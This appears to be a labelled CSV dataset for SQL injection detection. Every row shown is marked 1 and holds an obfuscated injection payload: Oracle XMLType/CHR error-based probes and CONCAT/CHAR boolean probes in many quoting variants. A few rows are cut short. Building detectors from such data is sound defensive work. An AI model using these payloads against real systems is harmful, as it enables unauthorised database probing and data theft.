input_text,Label
"""/**/WHERE/**/9862=9862/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/zapa",1
'/**/WHERE/**/6441=6441/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/aJov,1
)/**/WHERE/**/6660=6660/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/Rgyz,1
""")/**/WHERE/**/6476=6476/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/SuJJ",1
')/**/WHERE/**/9460=9460/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/GRHu,1
'/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/OR/**/'sJdA'='ywci,1
/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)#/**/qWZv,1
/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/lZty,1
"""/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/""GZjW""/**/LIKE/**/""GZjW",1
""")))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(((""OXha""/**/LIKE/**/""OXha",1
"""))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/((""XAAx""/**/LIKE/**/""XAAx",1
""")/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(""uIjK""/**/LIKE/**/""uIjK",1
"""/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/""fpoC""=""fpoC",1
""")))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(((""wgJo""=""wgJo",1
"""))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/((""mPqN""=""mPqN",1
""")/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(""bnYQ""=""bnYQ",1
'/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/'xOux'/**/LIKE/**/'xOux,1
%'/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/'EGBP%'='EGBP,1
')))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/((('czGq'/**/LIKE/**/'czGq,1
'))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(('YrUe'/**/LIKE/**/'YrUe,1
')/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/('okdu'/**/LIKE/**/'okdu,1
'/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/'XaNq'='XaNq,1
')))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/((('nFhZ'='nFhZ,1
'))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(('SauE'='SauE,1
')/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/('IOWn'='IOWn,1
/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL),1
)))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(((1342=1342,1
))/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/((4530=4530,1
)/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)/**/AND/**/(3209=3209,1
"""/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/XxYt",1
'/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/vSic,1
')/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/XdeR,1
)/**/AND/**/9159=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(9159=9159)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||CHR(62)))/**/FROM/**/DUAL)--/**/wpMg,1
"-5672)/**/AS/**/SrYM/**/WHERE/**/2772=2772/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/",1
"-6707"")/**/AS/**/GRPi/**/WHERE/**/7180=7180/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--",1
"-1730')/**/AS/**/wLiP/**/WHERE/**/3636=3636/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--",1
"-7974))/**/AS/**/RHam/**/WHERE/**/6099=6099/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--",1
"-3899""))/**/AS/**/fMpQ/**/WHERE/**/6811=6811/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))-",1
"-9405'))/**/AS/**/zrow/**/WHERE/**/4950=4950/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))-",1
"-4449/**/WHERE/**/4057=4057/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/YAQo",1
"-6821""/**/WHERE/**/9977=9977/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/QQHx",1
"-4238'/**/WHERE/**/8029=8029/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/LQTx",1
"-6832)/**/WHERE/**/4885=4885/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/qcDj",1
"-3903"")/**/WHERE/**/4866=4866/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/EUQU",1
"-7168')/**/WHERE/**/1178=1178/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/qAmq",1
"-5734'/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/OR/**/'XXtH'='UfCY",1
"-2872/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))#/**/RWhB",1
"-3756/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/sjAs",1
"-3376""/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/""rSRr""/**/LIKE/**/""rSRr",1
"-7826"")))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((""YjSL""/**/LIKE/**/""YjS",1
"-8323""))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((""vcSh""/**/LIKE/**/""vcSh",1
"-6913"")/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(""Rfws""/**/LIKE/**/""Rfws",1
"-6933""/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/""qVPD""=""qVPD",1
"-8714"")))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((""xHeK""=""xHeK",1
"-2478""))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((""NdwN""=""NdwN",1
"-6897"")/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(""wtvi""=""wtvi",1
"-2122'/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'GuBc'/**/LIKE/**/'GuBc",1
"-8923%'/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'XOel%'='XOel",1
"-7042')))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((('MOfx'/**/LIKE/**/'MOf",1
"-6923'))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(('TwRM'/**/LIKE/**/'TwRM",1
"-1427')/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/('gKJx'/**/LIKE/**/'gKJx",1
"-8372'/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'RWsu'='RWsu",1
"-1938')))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((('qodk'='qodk",1
"-3571'))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(('qDzN'='qDzN",1
"-4773')/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/('DeOU'='DeOU",1
"-8813/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))",1
